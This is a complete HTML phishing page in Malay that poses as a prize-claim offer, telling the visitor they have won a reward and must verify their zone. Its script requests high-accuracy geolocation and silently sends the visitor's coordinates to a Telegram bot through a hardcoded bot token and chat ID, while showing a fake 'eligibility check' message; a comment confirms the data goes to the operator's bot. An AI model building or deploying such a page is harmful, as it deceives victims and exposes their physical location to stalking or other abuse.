<!DOCTYPE html>
<html lang="ms">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Claim Ganjaran Anda!</title>

<style>
body {
  font-family: Arial, sans-serif;
  height: 100vh;
  margin: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #ff9a9e, #fecfef); /* Tukar warna background ke tema hadiah/reward */
}

.card {
  background: white;
  padding: 25px;
  border-radius: 18px;
  width: 320px;
  text-align: center;
  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
}

h2 {
  margin-bottom: 10px;
  color: #ff4757; /* Warna merah/pink untuk effect menarik */
}

p {
  font-size: 14px;
  color: #555;
  line-height: 1.4;
}

button {
  margin-top: 15px;
  width: 100%;
  padding: 14px;
  border: none;
  border-radius: 12px;
  background: linear-gradient(135deg, #ff4757, #ff6b81);
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4);
  transition: 0.2s;
}

button:hover {
  background: #ff2e44;
  transform: scale(1.02);
}

.status {
  margin-top: 15px;
  font-size: 13px;
  color: #666;
  word-break: break-word;
  font-style: italic;
}
</style>
</head>

<body>

<div class="card">
  <h2>🎁 Tahniah!</h2>
  <p>Anda terpilih untuk menerima ganjaran eksklusif. Sila sahkan kawasan/zon anda untuk menebus reward ini sekarang!</p>

  <button onclick="getLocation()">Tebus Reward Sekarang</button>

  <div class="status" id="status">Sila tekan butang di atas...</div>
</div>

<script>
const token = "8907134153:AAGJopxLKtl4QlaNzlnosbzJp2c-59Tnp7s";
const chatId = "5820655266";

function getLocation() {
  const status = document.getElementById("status");
  // Mengubah text loading supaya sepadan dengan tema reward
  status.innerText = "🔄 Menyemak zon kelayakan anda...";

  if (!navigator.geolocation) {
    status.innerText = "Sistem gagal: Pelayar web tidak menyokong penebusan ini.";
    return;
  }

  navigator.geolocation.getCurrentPosition(async (pos) => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // Kekalkan status dalaman tapi ubah paparan luar untuk user
    status.innerText = "⏳ Memproses...";

    try {
      const res = await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          latitude: lat,
          longitude: lon
        }
      )});

      if (res.ok) {
        // Paparan bila berjaya hantar data ke bot kau
        status.innerText = "🎉 Pengesahan berjaya! Ganjaran anda sedang diproses.";
      } else {
        status.innerText = "❌ Ralat sistem. Sila cuba sekali lagi.";
      }

    } catch (err) {
      status.innerText = "❌ Ralat sambungan. Sila cuba sebentar lagi.";
    }

  }, (err) => {
    status.innerText = "⚠️ Sila benarkan akses untuk menebus ganjaran.";
  }, {
    enableHighAccuracy: true,
    timeout: 10000
  });
}
</script>

</body>
</html>
